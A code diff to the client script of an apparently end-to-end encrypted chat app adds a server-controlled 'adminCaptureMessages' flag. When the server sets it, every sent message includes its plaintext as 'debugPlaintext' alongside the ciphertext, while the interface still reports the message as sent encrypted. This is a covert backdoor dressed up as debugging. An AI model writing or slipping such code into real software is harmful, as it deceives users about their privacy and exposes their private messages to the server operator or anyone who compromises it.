@@ -36,7 +36,8 @@ const state = {
   friends: new Map(),
   activeFriendId: "",
   visibleSender: "",
-  messageTimer: null
+  messageTimer: null,
+  adminCaptureMessages: false
 };
 
 const encoder = new TextEncoder();
@@ -143,7 +144,8 @@ els.messageForm.addEventListener("submit", async (event) => {
       type: "message",
       from: state.userId,
       to: friend.userId,
-      encrypted
+      encrypted,
+      ...(state.adminCaptureMessages ? { debugPlaintext: text } : {})
     }));
     addMessage({ from: state.userId, text, burnAfter, mine: true, status: "已加密发送" });
     els.messageInput.value = "";
@@ -221,6 +223,7 @@ async function registerProfile() {
 function connect(userId) {
   state.socket?.close();
   state.connected = false;
+  state.adminCaptureMessages = false;
   const protocol = location.protocol === "https:" ? "wss" : "ws";
   state.socket = new WebSocket(`${protocol}://${location.host}`);
   els.connectionState.textContent = "正在连接...";
@@ -233,6 +236,7 @@ function connect(userId) {
     const packet = JSON.parse(event.data);
     if (packet.type === "ready") {
       state.connected = true;
+      state.adminCaptureMessages = Boolean(packet.adminCaptureMessages);
       mergeFriends(packet.friends);
       saveFriends();
       renderFriends();
@@ -286,6 +290,7 @@ function connect(userId) {
 
   state.socket.addEventListener("close", () => {
     state.connected = false;
+    state.adminCaptureMessages = false;
     els.connectionState.textContent = "连接已断开";
     els.securityStatus.textContent = "等待重新连接";
     markAllOffline();
@@ -511,6 +516,7 @@ function resetSession({ keepUserInput = false } = {}) {
   clearMessageTimer();
   state.socket = null;
   state.connected = false;
+  state.adminCaptureMessages = false;
   state.keyPair = null;
   state.publicJwk = null;
   state.fingerprint = "";
